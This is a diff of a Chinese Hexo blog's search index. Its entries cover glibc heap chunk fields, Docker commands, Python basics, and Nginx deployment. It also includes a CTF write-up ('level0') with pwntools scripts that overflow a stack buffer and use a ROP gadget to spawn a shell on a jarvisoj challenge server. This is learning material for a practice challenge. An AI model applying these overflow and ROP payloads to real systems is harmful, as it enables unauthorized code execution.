+<li><p>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</p>
+</li>
+</ul>
+</blockquote>
+</li>
+<li><p><strong>fd，bk</strong></p>
+<blockquote>
+<p>malloc成功时返回的地址就是fd的地址</p>
+<p>chunk 处于分配状态时，从 fd 字段开始是用户的数据,<code>chunk 被free</code>后才发挥作用</p>
+<ul>
+<li>fd 指向下一个（非物理相邻）空闲的 chunk</li>
+<li>bk 指向上一个（非物理相邻）空闲的 chunk</li>
+</ul>
+</blockquote>
+</li>
+<li><p><strong>fd_nextsize， bk_nextsize</strong><code>chunk 被free</code>的时候才使用，用于<code>large chunk</code>。</p>
+<blockquote>
+<ul>
+<li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
+<li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>堆</category>
+      </categories>
+      <tags>
+        <tag>-chunk结构 -malloc -linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>level0</title>
+    <url>/2019/08/08/level0/</url>
     <content><![CDATA[<a id="more"></a>
 
-
-
-
-<p>python在写代码时不用声明变量</p>
-<pre><code>在了解基本数据类型的时候，我们需要了解基本数据类型有哪些？
-数字int、布尔值bool、字符串str、列表list、元组tuple、字典dict等，
-其中包括他们的基本用法和其常用的方法，这里会一一列举出来
-然后我们还需要了解一些运算符，
-因为这些基本数据类型常常会用于一些运算等等</code></pre><p>二、基本数据类型</p>
-<p>1、数字  —&gt; int类</p>
-<p>　　    当然对于数字，Python的数字类型有int整型、long长整型、float浮点数、complex复数、以及布尔值（0和1），这里只针对int整型进行介绍学习。</p>
-<p>　　　　在Python2中，整数的大小是有限制的，即当数字超过一定的范围不再是int类型，而是long长整型，而在Python3中，无论整数的大小长度为多少，统称为整型int。</p>
-<p>2、布尔值  </p>
-<p>—&gt;bool类
-　　</p>
-<p>对于布尔值，只有两种结果即True和False，其分别对应与二进制中的0和1。</p>
-<p>而对于真即True的值太多了，我们只需要了解假即Flase的值有哪些</p>
-<p>—》</p>
-<p>None、空（即 [ ]/( ) /“ “/{ }）、0；</p>
-<p>3、字符串  </p>
-<p>—&gt;str类</p>
-<p>　　　     关于字符串是Python中最常用的数据类型，其用途也很多，我们可以使用单引号 ‘’或者双引号“”来创建字符串。</p>
-<p>　　　　   字符串是不可修改的。所有关于字符我们可以从 索引、切片、长度、遍历、删除、分割、清除空白、大小写转换、判断以什么开头等方面对字符串进行介绍。</p>
-<p>#一</p>
-<pre><code>创建字符串    s=&quot;abcda&quot;    或    s=&apos;abcda&apos;
-
-截取字符串    s[1]=&apos;b&apos;    s[0,-2]=&apos;abc&apos;
-             #从第一个到倒数第二个，不包含倒数第二个</code></pre><p>#二</p>
-<p>索引         index()、find()</p>
-<p>ndex()与find()的不同之处在于：若索引的该字符或者序列不在字符串内，对于index–》ValueError: substring not found，而对于find –&gt;返回 -1</p>
-<pre><code>一.        s.index(&quot;a&quot;,2)    =    4
-#index--&gt;获取索引，第二个参数指定获取该子字符或者子序列的第几个
-
-        s.find(&apos;a&apos;,3)    =    -1</code></pre><p>#三<br>长度        len()</p>
-<pre><code>len(s)    =    5</code></pre><p>删除  del</p>
-<pre><code>#删除字符串，也是删除变量
-&gt;&gt;&gt; name =&quot;little-five&quot;
-&gt;&gt;&gt; del name</code></pre><p> 判断字符串内容  isalnum()、isalpha()、isdigit()　</p>
-<pre><code>isalnum()    #判断是否全为数字
-isalpha()    #判断是否全为字母
-isdigit()    #判断是否全为数字或者字母
-
-返回值为bool型，是为True，否为Flase</code></pre><p> 大小写转换  capitalize()、lower()、upper()、title()、casefold()</p>
-<pre><code>#大小写的互相转换    s.swapcase()
-#首字母大写        s.capitalize()
-#全部转为小写        s.lower()
-#全部转为大写        s.upper()</code></pre><p>jion方法</p>
-<pre><code>#join--&gt; join(): 连接字符串数组。
-将字符串、元组、列表中的元素以指定的字符(分隔符)连接生成一个新的字符串
-
-#字符串
-name =&quot;littefive&quot;
-&quot;-&quot;.join(name)
-&apos;l-i-t-t-e-f-i-v-e&apos;
-
-#列表
-info = [&quot;xiaowu&quot;,&quot;say&quot;,&quot;hello&quot;,&quot;world&quot;]
-&quot;--&quot;.join(info)
-&apos;xiaowu--say--hello--world&apos;</code></pre><p>　4、列表    list类<br>　    列表是由一系列特定元素顺序排列的元素组成的，它的元素可以是任何数据类型即数字、字符串、列表、元组、字典、布尔值等等，同时其元素也是可修改的。</p>
-<pre><code>names = [&apos;little-five&quot;,&quot;James&quot;,&quot;Alex&quot;]
- #或者
-names = list([&apos;little-five&quot;,&quot;James&quot;,&quot;Alex&quot;])</code></pre><p>#一.<br>    #索引    从0开始，而不是从一开始<br>    name =[“xiaowu”,”little-five”,”James”]<br>    print(name[0:-1])<br><br><br>    #切片    负数为倒数第几个，其为左闭右开，<br>        如不写，前面表示包含前面所有元素,后面则表示后面所有元素<br>    m1 =name[1:]<br>    print(m1)<br>    #输出为–&gt;[‘little-five’, ‘James’]<br>    m2 =name[:-1]<br>    print(m2)<br>    #输出为–&gt;[‘xiaowu’, ‘little-five’]</p>
-<p>#二.<br>    #一、将其他列表元素添加至列表内<br>        name.extend([“alex”,”green”])<br><br>    #二、将字符串元素添加到列表内<br>        name.extend(“hello”)<br><br>    #三、将字典元素添加至列表内，注：字典的key<br>        name.extend({“hello”:”world”})</p>
-<p>　pop()        取出</p>
-<pre><code>#pop()--取出，可将取出的值作为字符串赋予另外一个变量
-
-name =[&quot;xiaowu&quot;,&quot;little-five&quot;,&quot;James&quot;]
-special_name =name.pop(1)</code></pre><p>#三<br>5、元组        tuple类</p>
-<p>元组即为不可修改的列表。<br>其于特性跟list相似。其使用圆括号而不是方括号来标识。 </p>
-<pre><code>#元组
-name = (&quot;little-five&quot;,&quot;xiaowu&quot;)
-print(name[0])</code></pre><p>#四.<br>字典        dict类
-　　　 </p>
-<p>字典为一系列的键-值对，每个键值对用逗号隔开，每个键都与一个值相对应，可以通过使用键来访问对应的值。无序的。
-　</p>
-<p>键的定义必须是不可变的，即可以是数字、字符串也可以是元组，还有布尔值等。</p>
-<p>而值的定义可以是任意数据类型。</p>
-<pre><code>#字典的定义
-
-info ={
-    1:&quot;hello world&quot;,  #键为数字
-    (&quot;hello world&quot;):1, #键为元组
-    False:{&quot;name&quot;:&quot;James&quot;},
-    &quot;age&quot;:22
-}    </code></pre><p>遍历        items、keys、values</p>
-<pre><code>info ={
-   &quot;name&quot;:&quot;little-five&quot;,
-   &quot;age&quot;:22,
-   &quot;email&quot;:&quot;99426353*@qq,com&quot;
-}
-#键
-for key in info:
-    print(key)
-    print(info.keys())
-    #输出为：    dict_keys([&apos;name&apos;, &apos;age&apos;, &apos;email&apos;])</code></pre><figure class="highlight"><table><tr><td class="code"><pre><span class="line">#键值对</span><br><span class="line">print(info.items())</span><br><span class="line">#输出为:	dict_items([('name', 'little-five'), </span><br><span class="line">('age', 22), ('email', '99426353*@qq,com')])</span><br><span class="line"></span><br><span class="line">#值</span><br><span class="line">print(info.values())</span><br><span class="line">#输出为：dict_values(['little-five', 22, '99426353*@qq,com'])</span><br></pre></td></tr></table></figure>]]></content>
+<p>1.首先要用到</p>
+<pre><code>&apos;file&apos;  ，来查看用多少位的ida打开。
+&apos;checksec&apos; ，用来查看文件的保护机制</code></pre><p><img alt data-src="/2019/08/08/level0/checksec.png" class="lazyload"></p>
+<pre><code>Stack 的作用是防止栈的溢出
+NX    的作用为防止栈中的可执行代码
+  其他的我还不太了解，以后再说</code></pre><p>2.ida基本操作</p>
+<pre><code>首先打开文件后可以按空格键，查看地址与汇编指令
+在功能表里找到main,便于分析程序
+按tab键会出现伪代码，我们分析这个来找出漏洞
+shift+F12可以出现字符串表
+ctrl+F 可以出现查找框
+想查找某个变量的地址，只需点击后按tab键</code></pre><p>3.本题所涉及的知识</p>
+<pre><code>首先查找漏洞在read函数，可以通过栈的溢出来覆盖函数的返回地址
+这里要了解一下栈的基本结构以及如何传递内容
+然后调用callsystem函数来获取shell</code></pre><p><img alt data-src="/2019/08/08/level0/z.png" class="lazyload"></p>
+<p>4.脚本的书写</p>
+<pre><code>1.from pwn import *
+    (导入pwn里的内容)
+2.p=remote(&apos;地址&apos;,端口)
+    （连接服务器并创建一个对象）、
+3.p.recv()  p.recvline() p.recvuntil()
+    (都是接受服务器返回的字符串，具体区别不太懂)
+4.p.send()  p.sendline() p.sendafter()
+    (都是向服务器传入字符串，具体区别不太懂)
+5.p.interactive()
+    (结尾加上，啥意思不懂)</code></pre><p>5.本题payload的构建</p>
+<pre><code>1.buf距离rbp 0x80，rbp本身占位8
+2.函数返回地址可填callsystem的地址
+3.payload=ox88*&apos;a&apos;+addr_callsystem</code></pre><p>6.产生的问题及解决</p>
+<pre><code>1.做完level1，你会想用system函数及“/bin/sh”字符串传参来做level0，但是本题并不能用
+    payload=0x88*&apos;a&apos;+p64(addr_system)+p64(0)+p64(addr_binsh)
+2.为什么呢？原来是因为64位的传参并不是由直接栈传入，而是储存在寄存器里，所以payload的构建也要改变。
+当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9
+当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</code></pre><p><img alt data-src="/2019/08/08/level0/rop.png" class="lazyload"></p>
+<pre><code>3.所以构建的payload为
+    payload=0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0)</code></pre><p>7.两种脚本：</p>
+<p>一</p>
+<p>`</p>
+<pre><code>#coding:utf-8
+from pwn import *
+p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
+s_addr=0x0000000000400596
+p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(s_addr))
+p.interactive()</code></pre><p><code>二</code></p>
+<pre><code> #coding:utf-8
+from pwn import *
+p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
+rdi=0x400663
+p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0))
+p.interactive()</code></pre><p>`</p>
+]]></content>
       <tags>
-        <tag>语言基础</tag>
+        <tag>做题题解</tag>
       </tags>
   </entry>
   <entry>
@@ -507,175 +492,93 @@ shell管理你与操作系统之间的交互：
       </tags>
   </entry>
   <entry>
-    <title>hexo Butterfly主题配置及部署到服务器</title>
-    <url>/2020/04/06/hexo%E4%B8%BB%E9%A2%98%E6%90%AD%E5%BB%BA/</url>
-    <content><![CDATA[<h1 id="安装Butterfly主题与配置"><a href="#安装Butterfly主题与配置" class="headerlink" title="安装Butterfly主题与配置"></a>安装Butterfly主题与配置</h1><figure class="highlight"><table><tr><td class="code"><pre><span class="line">这个主题还是很不错的，我花了一个多礼拜的时间来搞。</span><br><span class="line">说明：我安装的是2.0.0版本的，因为以上版本我本地'hexo g'会出错</span><br></pre></td></tr></table></figure>
+    <title>docker基础</title>
+    <url>/2020/02/16/docker%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[<h2 id="什么是DOCKER"><a href="#什么是DOCKER" class="headerlink" title="什么是DOCKER"></a>什么是DOCKER</h2><p><a href="HTTPS://WWW.CNBLOGS.COM/ECJTUACM-873284962/P/9789130.HTML" target="_blank" rel="noopener">别人的吐血总结</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Docker 将应用程序与该程序的依赖，打包在一个文件里面。运行这个文件，就会生成一个虚拟容器。程序在这个虚拟容器里运行，就好像在真实的物理机上运行一样。有了 Docker ，就不用担心环境问题。</span><br></pre></td></tr></table></figure>
 
-<h2 id="主题安装"><a href="#主题安装" class="headerlink" title="主题安装"></a>主题安装</h2><p><a href="https://github.com/jerryc127/hexo-theme-butterfly/releases" target="_blank" rel="noopener">资源链接</a> </p>
-<p>直接点击下载比git clone要快的多，下载后解压到<code>hexo themes</code>目录下</p>
-<blockquote>
-<p>我主要将一些问题，配置说一下，要具体配置看<strong>相关博文链接</strong></p>
-</blockquote>
-<h2 id="hexo各目录作用"><a href="#hexo各目录作用" class="headerlink" title="hexo各目录作用"></a>hexo各目录作用</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml      <span class="comment">// 站点配置文件</span></span><br><span class="line">├── db.json          <span class="comment">// 缓存文件</span></span><br><span class="line">├── node_modules     <span class="comment">// 安装的插件以及hexo所需的一些nodejs模块</span></span><br><span class="line">├── package.json     <span class="comment">// 项目的依赖文件</span></span><br><span class="line">├── scaffolds        <span class="comment">// 模版文件	</span></span><br><span class="line">	-draft.md						</span><br><span class="line">	-page.md						</span><br><span class="line">	-post.md</span><br><span class="line">├── source           <span class="comment">// 源文件，用来存放你的文章 md 文件</span></span><br><span class="line">	-_posts</span><br><span class="line">└── themes           <span class="comment">// 主题文件</span></span><br></pre></td></tr></table></figure>
+<p>针对简单操作理解一下DOCKER</p>
+<p>拉取一个 DOCKER 镜像，我们可以用如下命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull image_name</span><br></pre></td></tr></table></figure>
 
-<p>hexo new <file> 默认是post.md，一般放在source中<code>_posts</code>目录，我们写作的博客都在这里。</file></p>
-<p>​    可以在<code>post.md</code>中设置自动生成的博客的格式</p>
-<p>主题下载到themes目录下</p>
-<h2 id="主题目录"><a href="#主题目录" class="headerlink" title="主题目录"></a>主题目录</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── LICENSE</span><br><span class="line">├── README.en.md       <span class="comment">// READEME 英文版</span></span><br><span class="line">├── README.md          <span class="comment">// READEME 中文文件</span></span><br><span class="line">├── _config.yml        <span class="comment">// 主题配置文件</span></span><br><span class="line">├── languages         <span class="comment">// 多语言配置文件 可以在hexo的_config.yml中配置</span></span><br><span class="line">├── layout            <span class="comment">// 模板文件</span></span><br><span class="line">├── package.json      <span class="comment">// 项目的依赖文件</span></span><br><span class="line">├── scripts           <span class="comment">// 主题的脚本文件</span></span><br><span class="line">├── source            <span class="comment">// 主题的资源文件 CSS IMG</span></span><br></pre></td></tr></table></figure>
+<p>image_name就是指的镜像</p>
+<p>pull就是拉取一个镜像</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Docker镜像	可以看作是一个特殊的文件系统，</span><br><span class="line">除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。</span><br></pre></td></tr></table></figure>
 
-<h2 id="Hexo-的工作原理"><a href="#Hexo-的工作原理" class="headerlink" title="Hexo 的工作原理"></a>Hexo 的工作原理</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">hexo g：</span><br><span class="line">    生成静态文件。</span><br><span class="line">    将我们的数据和界面相结合生成静态文件的过程。</span><br><span class="line">    会遍历主题文件中的 source 文件夹（js、css、img 等静态资源），然后建立索引，然后根据索引生成 pubild 文件夹中，此时的 <span class="keyword">public</span> 文件是由 html、 js、css、img 建立的纯静态文件可以通过 index.html 作为入口访问你的博客。</span><br><span class="line">hexo d：</span><br><span class="line">    部署文件。</span><br><span class="line">    部署主要是根据在 _config.yml 中配置的 git 仓库或者 coding 的地址，将 <span class="keyword">public</span> 文件上传至 github 或者 coding 中。</span><br><span class="line">    然后再根据上面的 github 提供的 pages 服务呈现出页面。当然你也可以直接将你生成的 <span class="keyword">public</span> 文件上传至你自己的服务器上。</span><br></pre></td></tr></table></figure>
+<h1 id="如何安装DOCKER"><a href="#如何安装DOCKER" class="headerlink" title="如何安装DOCKER?"></a>如何安装DOCKER?</h1><pre><code>docker rmi image_name        删除镜像
 
-<p>hexo大概就是将本地的文件，经过加工生成html文件。最后可上传到github或服务器上进行访问</p>
-<h2 id="主题配置"><a href="#主题配置" class="headerlink" title="主题配置"></a>主题配置</h2><h3 id="菜单的配置"><a href="#菜单的配置" class="headerlink" title="菜单的配置"></a>菜单的配置</h3><p><img alt data-src="https://i.loli.net/2020/04/06/FEwlX7jhDmV4oAq.png" class="lazyload"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:前面是显示的菜单名称</span><br><span class="line">|| 后面写图标名称 菜单图标可在网址里找 https://fontawesome.com/?from=io </span><br><span class="line">列表下面那种是分级目录</span><br></pre></td></tr></table></figure>
+docker run --name container-name -d image-name    运行容器
+--name：自定义容器名
+-d：表示后台运行
 
-<h3 id="创建page-tag等"><a href="#创建page-tag等" class="headerlink" title="创建page tag等"></a>创建page tag等</h3><p>刚开始，标签，分类，友链等都是没有界面的，所以用到命令</p>
-<p> <code>hexo new page &#39;name&#39;</code></p>
-<p>在hexo主目录中输入命令，会在<code>source</code>下出现相应目录</p>
-<p><code>tags</code>的配置</p>
-<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">title: 标签</span><br><span class="line">date: 2020-04-03 16:20:50</span><br><span class="line">type: "tags"</span><br><span class="line">top_img:</span><br></pre></td></tr></table></figure>
+docker ps（查看运行中的容器）；    加上-a；可以查看所有容器
 
-<p>top_img可以设置对应菜单下的图片,可以用图床生成图片链接</p>
-<p><code>link</code>的配置</p>
-<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">title: link</span><br><span class="line">date: 2020-04-05 17:34:13</span><br><span class="line">type: "link"</span><br><span class="line">top_img: https://i.loli.net/2020/04/05/hDjZveqHTd1LWsI.png</span><br></pre></td></tr></table></figure>
+docker stop container-name/container-id    停止当前运行的指定容器
 
-<p><code>categories</code>的配置</p>
-<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">title: 分类</span><br><span class="line">date: 2020-04-03 16:20:21</span><br><span class="line">type: "categories"</span><br><span class="line">top_img:</span><br></pre></td></tr></table></figure>
+启动    docker start container-name/container-id    启动容器
 
-<h3 id="友链的设置"><a href="#友链的设置" class="headerlink" title="友链的设置"></a>友链的设置</h3><p>在hexo的source目录生成 <code>_data</code>里面生成<code>link.yml</code>文件</p>
-<p>文件内容</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span>:</span></span><br><span class="line">  class_name: 友情链接</span><br><span class="line">  link_list:</span><br><span class="line">    <span class="number">1</span>:</span><br><span class="line">      name: <span class="comment">#名称</span></span><br><span class="line">      link: <span class="comment">#博客链接</span></span><br><span class="line">      avatar: <span class="comment">#头像</span></span><br><span class="line">      descr: <span class="comment">#描述</span></span><br><span class="line">    <span class="number">2</span>:</span><br><span class="line">      name:</span><br><span class="line">      link: </span><br><span class="line">      avatar: </span><br><span class="line">      descr:</span><br></pre></td></tr></table></figure>
+删除    docker rm container-id    删除指定容器
 
-<p>另外在主题的配置文件中Flink下设置自己的资料</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"># 友情鏈接界面設置</span><br><span class="line">Flink:</span><br><span class="line">  headline: 友情链接</span><br><span class="line">  info_headline: 我的Blog资料</span><br><span class="line">  name: Blog 名字： zzl14</span><br><span class="line">  address: Blog 地址： https:<span class="comment">//www.zzl14.xyz/link/</span></span><br><span class="line">  avatar: Blog 主题： Butterfly</span><br><span class="line">  info: Blog 简介： 日常学习总结</span><br><span class="line">  comment: 交换友链,请留言</span><br></pre></td></tr></table></figure>
-
-<p>界面如下<img alt="QQ截图20200406151505.png" data-src="https://i.loli.net/2020/04/06/TsqmJpDIulwQeCF.png" class="lazyload"></p>
-<h3 id="文章的图片设置"><a href="#文章的图片设置" class="headerlink" title="文章的图片设置"></a>文章的图片设置</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">title: &#123;&#123; title &#125;&#125;</span><br><span class="line">date: &#123;&#123; date &#125;&#125;</span><br><span class="line">category: &#123;&#123; category &#125;&#125;</span><br><span class="line">tags:</span><br><span class="line">top_img: <span class="comment">#文章顶部图片路径</span></span><br><span class="line">cover: <span class="comment">#封面路径</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="搜索框的设置"><a href="#搜索框的设置" class="headerlink" title="搜索框的设置"></a>搜索框的设置</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">local_search:</span><br><span class="line">  enable: true <span class="comment">#主题配置中设置为true,并在hexo主目录使用如下命令下载依赖，</span></span><br><span class="line">    </span><br><span class="line">npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure>
-
-<p>具体配置过程可能艰辛，但是慢慢来。</p>
-<h1 id="相关博文链接"><a href="#相关博文链接" class="headerlink" title="相关博文链接"></a>相关博文链接</h1><p><a href="https://ciweigg2.github.io/2019/07/04/hexo-theme-butterfly-zhu-ti-an-zhuang-ya/#toc-heading-5" target="_blank" rel="noopener">详细博文1</a></p>
-<p><a href="http://www.c-hasel.cn/2019/12/01/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%BA%8C/#%E5%AF%BC%E8%88%AA%E8%8F%9C%E5%8D%95" target="_blank" rel="noopener">详细博文2</a></p>
-<p><a href="http://yearito.cn/posts/hexo-get-started.html" target="_blank" rel="noopener">系列博文</a></p>
-<h1 id="hexo部署到服务器"><a href="#hexo部署到服务器" class="headerlink" title="hexo部署到服务器"></a>hexo部署到服务器</h1><p>由于github仓库的访问速度可能较慢，可能有必要搭建到服务器上进行访问。</p>
-<p>但是之后感觉其实没有太大必要</p>
-<p>先放一幅原理图（<a href="https://www.jianshu.com/p/e1ccd49b4e5d" target="_blank" rel="noopener">别人博客</a>的）</p>
-<p><img alt data-src="https://i.loli.net/2020/04/06/GPlK9CujERi4mk3.png" class="lazyload"></p>
-<p>所以我们需要在服务器搭建git仓库，下载Nginx，通过hooks将仓库部署到网站</p>
-<p>大致思路是</p>
-<p>1.本地上传到服务器的git仓库</p>
-<p>2.通过git仓库的hooks（钩子）将文件放到服务器的网站根目录（自己设置）</p>
-<p>3.通过Nginx将网站根目录的内容在公网ip进行展示</p>
-<blockquote>
-<p>安装nginx</p>
-<p>创建git用户</p>
-</blockquote>
-<h2 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh root@ip		#登录服务器</span><br><span class="line"></span><br><span class="line">sudo apt-get install nginx	(有时要用到 sudo apt-get update)</span><br><span class="line"><span class="meta">	#</span><span class="bash"> 或者</span></span><br><span class="line">sudo apt-get install apache2</span><br></pre></td></tr></table></figure>
-
-<h2 id="新建git用户"><a href="#新建git用户" class="headerlink" title="新建git用户"></a>新建git用户</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo adduser git		#新建git用户，下面会输入</span><br></pre></td></tr></table></figure>
-
-<h3 id="建立服务器端git仓库"><a href="#建立服务器端git仓库" class="headerlink" title="建立服务器端git仓库"></a>建立服务器端git仓库</h3><blockquote>
-<p>可以在hexo bash上上传到仓库</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo mkdir /zzl   # 创建个人git目录</span><br><span class="line">$ cd /zzl</span><br><span class="line">$ sudo mkdir blog.git  # 创建仓库</span><br><span class="line">$ cd blog.git</span><br><span class="line">$ sudo git init --bare # 初始化仓库</span><br></pre></td></tr></table></figure>
-
-<h3 id="建立网站根目录"><a href="#建立网站根目录" class="headerlink" title="建立网站根目录"></a>建立网站根目录</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo mkdir -p /home/git/hexo</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="改目录权限"><a href="#改目录权限" class="headerlink" title="改目录权限"></a>改目录权限</h3><blockquote>
-<p>因为在hexo的配置文件中repo选项是通过git进行上传</p>
-<p>所以要把目录权限给到git，并将用户目录权限改为775，即允许git用户写入</p>
-</blockquote>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo chown -R git:git /zzl /home/git/hexochmod -R git 775</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> chmod -R git 775</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="编辑hook函数"><a href="#编辑hook函数" class="headerlink" title="编辑hook函数"></a>编辑hook函数</h3><blockquote>
-<p>将上传到仓库的文件转到网站根目录</p>
-</blockquote>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> vim /zzl/blog.git/hooks/post-receive</span></span><br></pre></td></tr></table></figure>
-
-<p>填入以下内容</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">git --work-tree=/home/git/hexo --git-dir=/zzl/blog.git checkout -f</span><br></pre></td></tr></table></figure>
-
-<h3 id="在本地hexo-bash测试"><a href="#在本地hexo-bash测试" class="headerlink" title="在本地hexo bash测试"></a>在本地hexo bash测试</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@your_server_ip:/zzl/blog.git</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>如果提示你克隆了一个空仓库，代表成功</p>
-<p>但是每次都要输入密码才能上传</p>
-<p>这时候我们就要用到<code>rsa</code>加密进行身份验证，以后就不用输入密码</p>
-</blockquote>
-<h3 id="配置ssh"><a href="#配置ssh" class="headerlink" title="配置ssh"></a>配置ssh</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /home/git  #进到git目录</span><br><span class="line">su git    //切换git用户</span><br><span class="line">mkdir /home/git/.ssh  </span><br><span class="line">vi /home/git/.ssh/authorized_keys	#输入公钥</span><br></pre></td></tr></table></figure>
-
-<p>在之前的hexo与github仓库绑定时应该已经生成过</p>
-<p>我们可以再生成一次用来查看密钥位置</p>
-<p><code>ssh-keygen -t rsa</code></p>
-<p>会发现目录下有<code>id_rsa.pub</code>即公钥</p>
-<p>将公钥内容输入<code>/home/git/.ssh/authorized_keys</code></p>
-<blockquote>
-<p>最后在hexo bash 输入一下命令，如果不再输入密码，即配置成功</p>
-</blockquote>
-<p><code>ssh git@ip</code></p>
-<h2 id="配置网站根目录"><a href="#配置网站根目录" class="headerlink" title="配置网站根目录"></a>配置网站根目录</h2><p><code>nginx -t //查看nginx配置文件位置</code></p>
-<ul>
-<li>ubuntu</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>centos</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/conf.d/blog.conf</span><br></pre></td></tr></table></figure>
+端口映射    -p 6379:6379
+如:docker run  --name myredis  -d -p 6379:6379 docker.io/redis    
+-p:主机端口映射到容器内部的端口
 
 
+ docker中run和start的区别
+docker run 后面指定的是一个镜像
 
-</li>
-</ul>
-<blockquote>
-<p>不同版本的nginx或系统，nginx的配置文件不一定相同</p>
-</blockquote>
-<p>如果文件中有以下内容，就找对了文件</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    listen [::]:80;</span><br><span class="line">    root /hexo/git/hexo; # 修改的地方,改为设置的网站根目录的路径</span><br><span class="line">    server_name laoyuyu.me www.laoyuyu.me;  # 如果需要改域名访问，修改server_name 为域名便可</span><br><span class="line">    location / &#123;</span><br><span class="line">            # First attempt to serve request as file, then</span><br><span class="line">            # as directory, then fall back to displaying a 404.</span><br><span class="line">            try_files $uri $uri/ =404;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+而docker start指定的是一个容器
 
-<h3 id="最后重启服务，让NGINX生效"><a href="#最后重启服务，让NGINX生效" class="headerlink" title="最后重启服务，让NGINX生效"></a>最后重启服务，让NGINX生效</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service nginx restart</span><br></pre></td></tr></table></figure>
+docker run是利用镜像生成容器，并启动容器，而docker start是启动一个之前生成过的容器 </code></pre><p>#实例运行、<br>    运行交互式的容器</p>
+<pre><code>sudo docker run -i -t  skysider/pwndocker /bin/bash
+-t: 在新容器内指定一个伪终端或终端。
+-i: 允许你对容器内的标准输入 (STDIN) 进行交互。</code></pre><p>​<br>停止容器<br>​    docker stop </p>
+<p>exit 命令或者使用 CTRL+D 来退出容器。</p>
+<p>后台启动容器</p>
+<pre><code>sudo docker run -itd  skysider/pwndocker /bin/bash
+ -d 参数时，容器启动后会进入后台
+ -i: 允许你对容器内的标准输入 (STDIN) 进行交互。    
+ -t: 在新容器内指定一个伪终端或终端。</code></pre><p>docker ps 查看</p>
+<pre><code>在使用 -d 参数时，容器启动后会进入后台。此时想要进入容器，可以通过以下指令进入：
 
-<p>此时访问自己的ip可能出现403的情况，可能是因为没有上传东西。</p>
-<p>编辑<code>hexo _config.yml</code>文件</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">type: git <span class="comment">#用户名</span></span><br><span class="line">repo: git@ip:/zzl/blog.git <span class="comment">#Git仓库地址，ip为公网ip :符号后为Git仓库服务器路径</span></span><br><span class="line">branch: master <span class="comment">#分支，由于我们只用Git进行发布，master即可。</span></span><br></pre></td></tr></table></figure>
+docker attach
 
-<p><code>hexo d</code>上传之后再访问ip就可以了</p>
-<p>最后说一下git用户的权限更改</p>
